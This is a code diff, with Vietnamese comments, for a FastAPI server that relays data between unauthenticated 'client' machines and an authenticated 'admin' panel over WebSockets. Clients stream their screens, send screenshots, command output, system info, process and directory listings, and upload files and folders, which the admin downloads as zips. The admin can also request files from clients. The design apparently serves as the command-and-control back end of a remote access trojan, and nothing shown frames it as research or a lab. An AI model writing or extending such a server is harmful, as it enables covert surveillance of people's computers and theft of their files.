@@ -221,242 +221,193 @@ async def download_file(transfer_id: str, request: Request):
 
 @app.get("/download_folder/{transfer_id}")
 async def download_folder(transfer_id: str, request: Request):
-    """Admin download folder dưới dạng .zip."""
+    """Ghép tất cả file của folder transfer thành zip để admin download."""
     client_ip = get_client_ip(request)
     if not is_ip_authenticated(client_ip):
         raise HTTPException(status_code=401, detail="Not authenticated")
     
-    t = folder_transfers.get(transfer_id)
-    if not t:
-        return HTMLResponse("<h3>Folder not found or expired</h3>", status_code=404)
-    if not t.get("done"):
-        return HTMLResponse("<h3>Folder transfer not complete yet</h3>", status_code=425)
+    import zipfile as zf
+    ft = folder_transfers.get(transfer_id)
+    if not ft:
+        return HTMLResponse("<h3>Folder transfer not found</h3>", status_code=404)
+    if not ft.get("done"):
+        return HTMLResponse("<h3>Folder transfer incomplete</h3>", status_code=425)
 
-    import zipfile
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for arcname, chunks_data in t["files"].items():
-            file_data = io.BytesIO()
-            for i in range(len(chunks_data)):
-                chunk = chunks_data.get(i, "")
-                file_data.write(base64.b64decode(chunk))
-            file_data.seek(0)
-            zf.writestr(arcname, file_data.read())
-
-    zip_buffer.seek(0)
-    folder_name = t["folder_name"]
-    return StreamingResponse(
-        zip_buffer,
-        media_type="application/zip",
-        headers={"Content-Disposition": f'attachment; filename="{folder_name}.zip"'}
+    buf = io.BytesIO()
+    with zf.ZipFile(buf, "w", zf.ZIP_DEFLATED) as z:
+        for arcname, fdata in ft["files"].items():
+            chunks = fdata["chunks"]
+            total  = fdata["total_chunks"]
+            fbuf = io.BytesIO()
+            for i in range(total):
+                fbuf.write(base64.b64decode(chunks.get(i, "")))
+            z.writestr(arcname, fbuf.getvalue())
+    buf.seek(0)
+    fname = ft["folder_name"] + ".zip"
+    return StreamingResponse(buf, media_type="application/zip",
+        headers={"Content-Disposition": f'attachment; filename="{fname}"'}
     )
 
 # ===============================
-# CLIENT WEBSOCKET
+# CLIENT WEBSOCKET (NO AUTH)
 # ===============================
 
 @app.websocket("/ws/client/{client_id}")
-async def ws_client(websocket: WebSocket, client_id: str):
+async def client_ws(websocket: WebSocket, client_id: str):
     await websocket.accept()
     clients[client_id] = websocket
     print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
     await notify_admins_clients()
 
     try:
-        async for message in websocket:
-            try:
-                data = json.loads(message)
-                msg_type = data.get("type")
+        while True:
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            msg_type = message.get("type")
 
-                # ── Stream frame ──────────────────────────────────────
-                if msg_type == "stream_frame":
-                    await broadcast_stream_frame(client_id, data)
+            # ── Stream frame — forward nhanh nhất có thể ──────────
+            if msg_type == "stream_frame":
+                await broadcast_stream_frame(client_id, {
+                    "type": "stream_frame",
+                    "client_id": client_id,
+                    "image": message.get("image"),
+                    "ts": message.get("ts")
+                })
 
-                # ── Screenshot ────────────────────────────────────────
-                elif msg_type == "screenshot":
-                    await broadcast_to_admins({
-                        "type": "screenshot",
-                        "client_id": client_id,
-                        "image": data.get("image")
-                    })
+            # ── Screenshot ────────────────────────────────────────
+            elif msg_type == "screenshot":
+                await broadcast_to_admins({
+                    "type": "screenshot",
+                    "client_id": client_id,
+                    "image": message.get("image")
+                })
 
-                # ── Command result ────────────────────────────────────
-                elif msg_type == "command_result":
-                    await broadcast_to_admins({
-                        "type": "command_result",
-                        "client_id": client_id,
-                        "output": data.get("output")
-                    })
+            # ── Command result ────────────────────────────────────
+            elif msg_type == "command_result":
+                await broadcast_to_admins({
+                    "type": "command_result",
+                    "client_id": client_id,
+                    "output": message.get("output")
+                })
 
-                # ── System info ───────────────────────────────────────
-                elif msg_type == "sysinfo":
-                    await broadcast_to_admins({
-                        "type": "sysinfo",
-                        "client_id": client_id,
-                        "data": data.get("data")
-                    })
+            # ── File transfer: Client → Admin ─────────────────────
+            elif msg_type in ("file_transfer_start", "file_chunk", "file_transfer_done",
+                              "file_transfer_error", "file_transfer_progress",
+                              "folder_transfer_start", "folder_transfer_done", "folder_transfer_empty"):
+                transfer_id = message.get("transfer_id")
 
-                # ── Processes ─────────────────────────────────────────
-                elif msg_type == "processes":
-                    await broadcast_to_admins({
-                        "type": "processes",
-                        "client_id": client_id,
-                        "data": data.get("data")
-                    })
-
-                elif msg_type == "kill_result":
-                    await broadcast_to_admins({
-                        "type": "kill_result",
-                        "client_id": client_id,
-                        "result": data.get("result")
-                    })
-
-                # ── Directory listing ─────────────────────────────────
-                elif msg_type == "directory_list":
-                    await broadcast_to_admins({
-                        "type": "directory_list",
-                        "client_id": client_id,
-                        "data": data.get("data"),
-                        "path": data.get("path")
-                    })
-
-                elif msg_type == "drives_list":
-                    await broadcast_to_admins({
-                        "type": "drives_list",
-                        "client_id": client_id,
-                        "data": data.get("data")
-                    })
-
-                # ── File content (for text/image preview) ─────────────
-                elif msg_type == "file_content":
-                    await broadcast_to_admins({
-                        "type": "file_content",
-                        "client_id": client_id,
-                        "data": data.get("data"),
-                        "path": data.get("path")
-                    })
-
-                # ── File transfer: Client → Admin ────────────────────
-                elif msg_type == "file_transfer_start":
-                    tid = data.get("transfer_id")
-                    file_transfers[tid] = {
-                        "filename": data.get("filename"),
-                        "file_size": data.get("file_size"),
-                        "total_chunks": data.get("total_chunks"),
-                        "chunks": {},
-                        "done": False,
-                        "total_files": data.get("total_files"),
-                        "file_index": data.get("file_index"),
-                        "is_folder": data.get("is_folder", False)
-                    }
-                    await broadcast_to_admins({
-                        "type": "file_transfer_start",
-                        "client_id": client_id,
-                        "transfer_id": tid,
-                        "filename": data.get("filename"),
-                        "file_size": data.get("file_size"),
-                        "total_chunks": data.get("total_chunks"),
-                        "total_files": data.get("total_files"),
-                        "file_index": data.get("file_index"),
-                        "is_folder": data.get("is_folder", False)
-                    })
-
-                elif msg_type == "file_chunk":
-                    tid = data.get("transfer_id")
-                    if tid in file_transfers:
-                        chunk_idx = data.get("chunk_idx")
-                        file_transfers[tid]["chunks"][chunk_idx] = data.get("data")
-                        await broadcast_to_admins({
-                            "type": "file_chunk",
-                            "client_id": client_id,
-                            "transfer_id": tid,
-                            "chunk_idx": chunk_idx,
-                            "total_chunks": data.get("total_chunks")
-                        })
-
-                elif msg_type == "file_transfer_done":
-                    tid = data.get("transfer_id")
-                    if tid in file_transfers:
-                        file_transfers[tid]["done"] = True
-                        await broadcast_to_admins({
-                            "type": "file_transfer_done",
-                            "client_id": client_id,
-                            "transfer_id": tid,
-                            "filename": data.get("filename"),
-                            "file_size": data.get("file_size"),
-                            "file_index": data.get("file_index"),
-                            "total_files": data.get("total_files"),
-                            "is_folder": data.get("is_folder", False)
-                        })
-
-                elif msg_type == "file_transfer_error":
-                    await broadcast_to_admins({
-                        "type": "file_transfer_error",
-                        "client_id": client_id,
-                        "transfer_id": data.get("transfer_id"),
-                        "error": data.get("error")
-                    })
-
-                # ── Folder transfer ───────────────────────────────────
-                elif msg_type == "folder_transfer_start":
-                    tid = data.get("transfer_id")
-                    folder_transfers[tid] = {
-                        "folder_name": data.get("folder_name"),
-                        "total_files": data.get("total_files"),
+                if msg_type == "folder_transfer_start":
+                    folder_transfers[transfer_id] = {
+                        "folder_name": message.get("folder_name"),
+                        "total_files": message.get("total_files"),
                         "files": {},
                         "done": False
                     }
-                    await broadcast_to_admins({
-                        "type": "folder_transfer_start",
-                        "client_id": client_id,
-                        "transfer_id": tid,
-                        "folder_name": data.get("folder_name"),
-                        "total_files": data.get("total_files")
-                    })
 
                 elif msg_type == "folder_transfer_done":
-                    tid = data.get("transfer_id")
-                    if tid in folder_transfers:
-                        folder_transfers[tid]["done"] = True
-                        await broadcast_to_admins({
-                            "type": "folder_transfer_done",
-                            "client_id": client_id,
-                            "transfer_id": tid,
-                            "folder_name": data.get("folder_name"),
-                            "total_files": data.get("total_files")
-                        })
+                    if transfer_id in folder_transfers:
+                        folder_transfers[transfer_id]["done"] = True
 
-                # ── Admin → Client file save result ───────────────────
-                elif msg_type == "file_save_result":
-                    await broadcast_to_admins({
-                        "type": "file_save_result",
-                        "client_id": client_id,
-                        "transfer_id": data.get("transfer_id"),
-                        "path": data.get("path"),
-                        "error": data.get("error")
-                    })
+                elif msg_type == "file_transfer_start":
+                    is_folder = message.get("is_folder", False)
+                    arcname   = message.get("filename")
+                    total_c   = message.get("total_chunks")
+                    if is_folder and transfer_id in folder_transfers:
+                        # Track individual file inside folder
+                        folder_transfers[transfer_id]["files"][arcname] = {"chunks": {}, "total_chunks": total_c}
+                    else:
+                        file_transfers[transfer_id] = {
+                            "filename": arcname,
+                            "file_size": message.get("file_size"),
+                            "total_chunks": total_c,
+                            "chunks": {},
+                            "done": False,
+                            "client_id": client_id
+                        }
 
-            except json.JSONDecodeError:
-                pass
+                elif msg_type == "file_chunk":
+                    idx  = message.get("chunk_idx")
+                    data_val = message.get("data")
+                    is_folder = message.get("is_folder") or (transfer_id in folder_transfers)
+                    if is_folder and transfer_id in folder_transfers:
+                        # Find current file being transferred
+                        for arcname, fdata in folder_transfers[transfer_id]["files"].items():
+                            if len(fdata["chunks"]) < fdata["total_chunks"] and idx not in fdata["chunks"]:
+                                fdata["chunks"][idx] = data_val
+                                break
+                    elif transfer_id in file_transfers:
+                        file_transfers[transfer_id]["chunks"][idx] = data_val
+
+                elif msg_type == "file_transfer_done":
+                    is_folder = message.get("is_folder", False)
+                    if not is_folder and transfer_id in file_transfers:
+                        file_transfers[transfer_id]["done"] = True
+                        print(f"[FILE] Done: {message.get('filename')} ({message.get('file_size')} bytes)")
+
+                # Relay progress đến admin
+                await broadcast_to_admins({
+                    "type": msg_type,
+                    "client_id": client_id,
+                    "transfer_id": transfer_id,
+                    "filename": message.get("filename"),
+                    "file_size": message.get("file_size"),
+                    "total_chunks": message.get("total_chunks"),
+                    "chunk_idx": message.get("chunk_idx"),
+                    "error": message.get("error")
+                })
+
+            # ── File save result (Admin → Client download kết quả) ─
+            elif msg_type == "file_save_result":
+                await broadcast_to_admins({
+                    "type": "file_save_result",
+                    "client_id": client_id,
+                    "transfer_id": message.get("transfer_id"),
+                    "path": message.get("path"),
+                    "error": message.get("error")
+                })
+
+            # ── Client connected (sysinfo) ─────────────────────────
+            elif msg_type == "client_connected":
+                await broadcast_to_admins({
+                    "type": "client_info",
+                    "client_id": client_id,
+                    "sysinfo": message.get("sysinfo")
+                })
+
+            # ── Other data (sysinfo, processes, files…) ───────────
+            else:
+                await broadcast_to_admins({
+                    "type": msg_type,
+                    "client_id": client_id,
+                    "data": message.get("data"),
+                    "result": message.get("result"),
+                    "path": message.get("path"),
+                    "message": message.get("message"),
+                    "status": message.get("status")
+                })
 
     except WebSocketDisconnect:
         pass
     except Exception as e:
-        print(f"[CLIENT ERR] {e}")
+        print(f"[CLIENT ERR] {client_id}: {e}")
     finally:
-        clients.pop(client_id, None)
-        await notify_admins_clients()
+        if client_id in clients:
+            del clients[client_id]
+        # Dừng stream cho các admin đang xem client này
         await stop_stream_for_client(client_id)
         print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
+        await notify_admins_clients()
 
 # ===============================
-# ADMIN WEBSOCKET
+# ADMIN WEBSOCKET (WITH AUTH CHECK)
 # ===============================
 
 @app.websocket("/ws/admin")
-async def ws_admin(websocket: WebSocket, request: Request):
-    client_ip = get_client_ip(request)
+async def admin_ws(websocket: WebSocket):
+    # Get IP from websocket
+    client_ip = websocket.client.host
     
+    # Check authentication
     if not is_ip_authenticated(client_ip):
         await websocket.close(code=1008, reason="Not authenticated")
         return
@@ -546,15 +497,6 @@ async def ws_admin(websocket: WebSocket, request: Request):
                     await clients[client_id].send_text(json.dumps({
                         "type": "read_file",
                         "path": message.get("path")
-                    }))
-
-            # ── Write file (save edited text) ─────────────────────
-            elif msg_type == "write_file":
-                if client_id in clients:
-                    await clients[client_id].send_text(json.dumps({
-                        "type": "write_file",
-                        "path": message.get("path"),
-                        "content": message.get("content")
                     }))
 
             # ── File: Admin yêu cầu Client gửi file lên ───────────
